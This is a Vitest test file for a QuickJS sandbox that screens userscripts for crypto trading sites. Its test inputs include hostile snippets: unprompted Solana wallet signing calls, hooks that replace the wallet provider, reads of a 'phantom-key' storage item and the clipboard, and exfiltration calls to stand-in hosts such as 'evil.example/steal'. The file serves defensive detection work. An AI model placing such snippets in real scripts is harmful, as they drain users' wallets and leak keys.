import { readFileSync } from 'node:fs';
import { describe, expect, it, vi } from 'vitest';
import { runIsolatedSandbox, sandboxPage } from './isolate';

const header = (body: string) => `// ==UserScript==
// @name t
// @match https://axiom.trade/*
// @grant none
// ==/UserScript==
${body}
`;

describe('QuickJS sandbox', () => {
  it('passes a quiet script and keeps egress blocked', async () => {
    const run = await runIsolatedSandbox(header("console.log('ok');"), 0);
    expect(run.mode).toBe('quickjs-wasm');
    expect(run.verdict).toBe('pass');
    expect(run.errors).toEqual([]);
    expect(run.egress).toBe('blocked');
    expect(run.log.join('\n')).toContain('console ok');
  });

  it('fails a script that signs on load, from a timer, or after an awaited promise', async () => {
    for (const body of [
      'window.solana.signTransaction({});',
      'setTimeout(() => window.phantom.solana.signAllTransactions([]), 5000);',
      'Promise.resolve().then(() => window.solflare.signMessage(new Uint8Array(1)));',
      "document.addEventListener('DOMContentLoaded', () => window.solana.request({ method: 'signAndSendTransaction' }));",
    ]) {
      const run = await runIsolatedSandbox(header(body), 0);
      expect(run.verdict, body).toBe('fail');
      expect(run.walletCalls.length, body).toBeGreaterThan(0);
    }
  });

  it('fails a script that replaces the wallet provider or hooks its signer', async () => {
    const swap = await runIsolatedSandbox(header('window.solana = { signTransaction() {} };'), 0);
    expect(swap.verdict).toBe('fail');
    expect(swap.walletCalls).toContain('overwrite:window.solana');
    const hook = await runIsolatedSandbox(
      header('window.solana.signTransaction = async (tx) => tx;'),
      0,
    );
    expect(hook.verdict).toBe('fail');
    expect(hook.walletCalls).toContain('overwrite:solana.signTransaction');
  });

  it('never passes a script that throws, at top level or inside a callback', async () => {
    const top = await runIsolatedSandbox(header('undefinedFunction();'), 0);
    expect(top.verdict).toBe('warn');
    expect(top.errors.join(' ')).toMatch(/undefinedFunction/);
    const later = await runIsolatedSandbox(
      header("setTimeout(() => { throw new Error('boom'); }, 100);"),
      0,
    );
    expect(later.verdict).toBe('warn');
    expect(later.errors.join(' ')).toContain('boom');
  });

  it('logs blocked network calls by host and never touches the real network', async () => {
    const spy = vi.spyOn(globalThis, 'fetch').mockRejectedValue(new Error('leaked'));
    const run = await runIsolatedSandbox(
      header(`
        fetch('https://evil.example/steal', { method: 'POST' });
        new WebSocket('wss://ws.evil.example');
        const x = new XMLHttpRequest(); x.open('GET', 'https://xhr.evil.example/a'); x.send();
        navigator.sendBeacon('https://beacon.evil.example', 'k');
        const s = document.createElement('script'); s.src = 'https://cdn.evil.example/x.js'; document.head.appendChild(s);
        new Image().src = 'https://pixel.evil.example/p.gif';
      `),
      0,
    );
    expect(spy).not.toHaveBeenCalled();
    spy.mockRestore();
    const hosts = run.requests.map((item) => `${item.method} ${item.host}`);
    expect(hosts).toEqual(
      expect.arrayContaining([
        'POST evil.example',
        'WS ws.evil.example',
        'GET xhr.evil.example',
        'BEACON beacon.evil.example',
        'SCRIPT cdn.evil.example',
        'GET pixel.evil.example',
      ]),
    );
    expect(run.verdict).toBe('warn');
  });

  it('records clipboard and storage access', async () => {
    const run = await runIsolatedSandbox(
      header("navigator.clipboard.readText(); localStorage.getItem('phantom-key');"),
      0,
    );
    expect(run.clipboard).toContain('read');
    expect(run.storageReads).toContain('localStorage:phantom-key');
    expect(run.verdict).toBe('warn');
  });

  it('stops a tight loop on the CPU tick budget even when the clock does not move', async () => {
    // Workers freeze Date.now() during pure compute; the tick budget must still stop it.
    const frozen = vi.spyOn(Date, 'now').mockReturnValue(1_000);
    try {
      const run = await runIsolatedSandbox('for (;;) {}', 0, { maxTicks: 50 });
      expect(run.verdict).toBe('fail');
      expect(run.errors.join(' ')).toMatch(/CPU budget/);
    } finally {
      frozen.mockRestore();
    }
  });

  it('kills a tight loop and a memory bomb inside the budget', async () => {
    const hung = await runIsolatedSandbox('while (true) {}', 0, { timeoutMs: 200 });
    expect(hung.verdict).toBe('fail');
    expect(hung.errors.join(' ')).toMatch(/timed out/i);
    expect(hung.durationMs).toBeLessThan(5_000);
    const bomb = await runIsolatedSandbox(
      'const a = []; for (;;) a.push(new Array(1e6).fill(1));',
      0,
      { timeoutMs: 8_000 },
    );
    expect(bomb.verdict).toBe('fail');
    expect(bomb.errors.join(' ')).toMatch(/memory|timed out/i);
  }, 30_000);

  it('a script cannot reach the host recorder or the node globals', async () => {
    const run = await runIsolatedSandbox(
      header(`
        if (typeof record !== 'undefined' || typeof process !== 'undefined' || typeof require !== 'undefined') {
          window.solana.signTransaction({});
        }
      `),
      0,
    );
    expect(run.verdict).toBe('pass');
  });

  it('provides browser globals legit userscripts rely on', async () => {
    const run = await runIsolatedSandbox(
      header(`
        const u = new URL('/api?x=1', location.href);
        if (u.host !== 'axiom.trade' || u.searchParams.get('x') !== '1') throw new Error('url');
        const c = structuredClone({ a: new Map([[1, { b: 2 }]]), d: new Date(0) });
        if (c.a.get(1).b !== 2) throw new Error('clone');
        if (atob(btoa('hi')) !== 'hi') throw new Error('b64');
        if (new TextDecoder().decode(new TextEncoder().encode('é')) !== 'é') throw new Error('utf8');
        const box = document.createElement('div');
        box.innerHTML = '<span class="v">x</span>';
        box.querySelector('.v').textContent = 'y';
        document.body.appendChild(box);
        new MutationObserver(() => {}).observe(document.body, { childList: true });
        GM_setValue('k', 1);
        requestAnimationFrame(() => {});
      `),
      0,
    );
    expect(run.errors).toEqual([]);
    expect(run.verdict).toBe('pass');
  });

  it('runs the real Trojan Trenches Intel userscript without errors', async () => {
    const source = readFileSync(
      new URL('./__fixtures__/trojan-trenches-intel.user.js', import.meta.url),
      'utf8',
    );
    const run = await runIsolatedSandbox(source, 0);
    expect(run.errors).toEqual([]);
    expect(run.walletCalls).toEqual([]);
    expect(run.timerRuns).toBeGreaterThan(0);
    // It polls Trojan's own API, which the sandbox logs and blocks.
    expect(run.requests.map((r) => r.host)).toContain('trade.api.trojan.com');
    expect(run.verdict).toBe('warn');
  });

  it('derives the page from @match', () => {
    expect(sandboxPage(header('')).host).toBe('axiom.trade');
    expect(
      sandboxPage('// ==UserScript==\n// @match *://*.gmgn.ai/*\n// ==/UserScript==').host,
    ).toBe('www.gmgn.ai');
    expect(sandboxPage('no header').host).toBe('example.com');
  });
});
